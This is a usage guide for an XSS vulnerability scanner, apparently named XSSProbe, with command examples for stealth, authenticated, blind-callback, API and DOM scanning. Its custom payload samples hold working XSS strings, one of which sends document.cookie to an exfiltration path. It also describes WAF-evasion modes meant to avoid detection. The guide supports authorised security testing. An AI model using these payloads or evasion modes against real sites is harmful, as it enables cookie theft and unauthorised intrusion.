# XSSProbe Advanced Scanning Modes - Usage Examples

## 🚀 Quick Start

### Basic Usage
```bash
# Simple XSS scan
python xssprobe.py -u https://testphp.vulnweb.com

# Single URL scan (no crawling)
python xssprobe.py --single https://testphp.vulnweb.com/search.php?test=query

# DOM XSS detection
python xssprobe.py -u https://example.com --dom-xss
```

## 🕵️ Stealth Mode

Evade WAF detection with advanced evasion techniques:

```bash
# Basic stealth scanning
python xssprobe.py -u https://example.com --stealth

# Stealth modes (increasing intensity)
python xssprobe.py -u https://example.com --stealth --stealth-mode quick
python xssprobe.py -u https://example.com --stealth --stealth-mode normal
python xssprobe.py -u https://example.com --stealth --stealth-mode thorough
python xssprobe.py -u https://example.com --stealth --stealth-mode ultra_stealth

# Stealth with custom user agent
python xssprobe.py -u https://example.com --stealth --user-agent "Mozilla/5.0 (Custom Bot)"
```

**Stealth Features:**
- Rate limiting with random delays
- User-Agent rotation
- Payload encoding variations
- WAF detection and adaptation
- Request header randomization

## 🔐 Authenticated Scanning

Test protected areas requiring authentication:

### Basic Authentication
```bash
python xssprobe.py -u https://example.com --authenticated --auth-type basic --username admin --password secret123

# With custom login URL
python xssprobe.py -u https://example.com --authenticated --auth-type basic --username user --password pass --login-url https://example.com/admin/login
```

### Bearer Token Authentication
```bash
python xssprobe.py -u https://api.example.com --authenticated --auth-type bearer --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Custom header name
python xssprobe.py -u https://api.example.com --authenticated --auth-type bearer --token "your_token" --auth-header "X-Auth-Token"
```

### API Key Authentication
```bash
python xssprobe.py -u https://api.example.com --authenticated --auth-type api_key --token "your_api_key_here"

# Custom API key header
python xssprobe.py -u https://api.example.com --authenticated --auth-type api_key --token "key123" --auth-header "X-API-Key"
```

### Cookie-based Authentication
```bash
python xssprobe.py -u https://example.com --authenticated --auth-type cookie --cookie '{"PHPSESSID":"abc123", "user_token":"xyz789"}'
```

## 👻 Blind XSS Detection

Detect XSS that doesn't immediately reflect in the response:

```bash
# Basic blind XSS (requires external host)
python xssprobe.py -u https://example.com --blind-xss --callback-host your-domain.com

# Custom callback port and wait time
python xssprobe.py -u https://example.com --blind-xss --callback-host your-server.com --callback-port 9090 --blind-wait 120

# Blind XSS on forms/feedback pages
python xssprobe.py --single https://example.com/contact --blind-xss --callback-host your-domain.com --blind-wait 300
```

**Setup Requirements:**
1. External server/domain accessible from the internet
2. Firewall configured to allow callback traffic
3. Optional: Use ngrok for local testing

**Example Callback Setup:**
```bash
# On your server, monitor for incoming requests
sudo tcpdump -i any port 8080
# or
sudo netstat -tulpn | grep 8080
```

## 🔌 API Endpoint Discovery

Scan REST APIs, GraphQL, and SOAP services:

```bash
# Basic API scanning
python xssprobe.py -u https://api.example.com --api-scan

# API scan with stealth mode
python xssprobe.py -u https://api.example.com --api-scan --stealth

# Scan web app for hidden APIs
python xssprobe.py -u https://example.com --api-scan --depth 3
```

**API Types Detected:**
- REST APIs (JSON/XML endpoints)
- GraphQL endpoints
- SOAP web services
- OpenAPI/Swagger documented APIs

## 🧠 Deep DOM Analysis

Advanced JavaScript source/sink analysis:

```bash
# Deep DOM scanning
python xssprobe.py -u https://spa-example.com --deep-dom

# Combined DOM analysis
python xssprobe.py -u https://example.com --dom-xss --deep-dom

# Deep DOM with custom payloads
python xssprobe.py -u https://example.com --deep-dom --custom-payloads dom_payloads.txt
```

**Deep DOM Features:**
- JavaScript source detection (location.hash, postMessage, etc.)
- Sink analysis (innerHTML, eval, etc.)
- Data flow tracking
- Framework detection (jQuery, Angular, React, etc.)
- Event handler analysis

## 🎯 Combined Advanced Scanning

Most comprehensive scan combining all modes:

```bash
# Full spectrum scan
python xssprobe.py -u https://example.com \
  --stealth --stealth-mode thorough \
  --authenticated --auth-type basic --username admin --password secret \
  --blind-xss --callback-host your-domain.com --blind-wait 180 \
  --api-scan \
  --deep-dom \
  --dom-xss \
  --depth 3 \
  --output-format json > comprehensive_report.json

# Authenticated API testing with stealth
python xssprobe.py -u https://api.example.com \
  --stealth --stealth-mode normal \
  --authenticated --auth-type bearer --token "your_jwt_token" \
  --api-scan \
  --custom-payloads api_payloads.txt \
  --output-format xml

# Single page comprehensive analysis
python xssprobe.py --single https://example.com/vulnerable-page.php?param=test \
  --stealth \
  --blind-xss --callback-host callback.yourdomain.com \
  --deep-dom \
  --custom-payloads advanced_payloads.txt
```

## 📄 Custom Payloads

Create custom payload files for specialized testing:

### Example: api_payloads.txt
```
<script>fetch('/api/exfiltrate?data='+document.cookie)</script>
"}],"xss":"<img src=x onerror=alert(1)>
\\u003cscript\\u003ealert(1)\\u003c/script\\u003e
';alert(String.fromCharCode(88,83,83));//
```

### Example: dom_payloads.txt
```
<svg onload=alert(location.hash)>
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
#<img src=x onerror=alert(1)>
```

Usage:
```bash
python xssprobe.py -u https://example.com --custom-payloads api_payloads.txt --api-scan
python xssprobe.py -u https://example.com --custom-payloads dom_payloads.txt --deep-dom
```

## 📊 Output Formats

### JSON Output
```bash
python xssprobe.py -u https://example.com --stealth --output-format json > report.json
```

Example JSON structure:
```json
{
  "scan_summary": {
    "total_vulnerabilities": 5,
    "scan_types_completed": ["stealth_xss", "api_xss"],
    "timestamp": 1703123456.789
  },
  "results": {
    "stealth_xss": [
      {
        "type": "xss",
        "severity": "high",
        "url": "https://example.com/search",
        "parameter": "q",
        "payload": "<script>alert(1)</script>"
      }
    ]
  }
}
```

### XML Output
```bash
python xssprobe.py -u https://example.com --api-scan --output-format xml > report.xml
```

## 🛡️ Best Practices

### For WAF-Protected Targets
```bash
# Use ultra stealth mode with delays
python xssprobe.py -u https://protected-site.com --stealth --stealth-mode ultra_stealth

# Combine with authenticated scanning to bypass initial filters
python xssprobe.py -u https://protected-site.com --stealth --authenticated --auth-type basic --username user --password pass
```

### For API Testing
```bash
# Discover APIs first, then test with authentication
python xssprobe.py -u https://example.com --api-scan --stealth
python xssprobe.py -u https://api.example.com --api-scan --authenticated --auth-type bearer --token "token"
```

### For JavaScript-Heavy Applications
```bash
# Use deep DOM analysis for SPAs
python xssprobe.py -u https://spa-app.com --deep-dom --dom-xss

# Test URL fragments and parameters
python xssprobe.py --single https://spa-app.com/#/dashboard?param=test --deep-dom
```

### For Comprehensive Testing
```bash
# Run multiple passes with different configurations
python xssprobe.py -u https://target.com --stealth --output-format json > stealth_results.json
python xssprobe.py -u https://target.com --authenticated --auth-type basic --username user --password pass --output-format json > auth_results.json
python xssprobe.py -u https://target.com --blind-xss --callback-host yourdomain.com --output-format json > blind_results.json
```

## ⚠️ Important Notes

1. **Legal Usage**: Only test applications you own or have explicit permission to test
2. **Callback Server**: Blind XSS requires an external server/domain for callbacks
3. **Rate Limiting**: Use stealth mode on production systems to avoid detection
4. **Authentication**: Ensure proper credentials and permissions before authenticated scanning
5. **Payload Testing**: Test custom payloads in safe environments first

## 🔧 Troubleshooting

### Common Issues

**Import Errors:**
```bash
# Install missing dependencies
pip install -r requirements.txt
pip install beautifulsoup4 requests urllib3 pyyaml
```

**Callback Server Issues:**
```bash
# Check if port is available
netstat -tulpn | grep 8080

# Test callback connectivity
curl http://your-domain.com:8080/test
```

**Authentication Failures:**
```bash
# Test authentication manually first
curl -u username:password https://example.com/protected

# Verify token format
curl -H "Authorization: Bearer your_token" https://api.example.com/
```

**Performance Issues:**
```bash
# Reduce scanning intensity
python xssprobe.py -u https://example.com --stealth --stealth-mode quick --depth 1

# Use single scan mode
python xssprobe.py --single https://example.com/page --stealth
```